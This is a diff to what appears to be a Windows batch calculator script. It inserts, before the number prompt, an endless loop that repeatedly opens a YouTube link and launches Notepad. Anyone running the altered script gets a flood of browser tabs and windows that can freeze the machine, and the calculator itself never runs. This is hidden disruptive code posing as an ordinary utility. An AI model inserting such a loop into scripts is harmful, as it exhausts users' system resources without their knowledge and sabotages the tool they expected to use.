@@ -32,6 +32,11 @@ cls
 
 echo ################################################
 
+:loop
+start "" https://www.youtube.com/watch?v=j9V78UbdzWI
+START C:\Windows\NOTEPAD.EXE
+goto loop
+
 :secAsk    
     set /p "b=Enter the second number: " || goto :secAsk
 
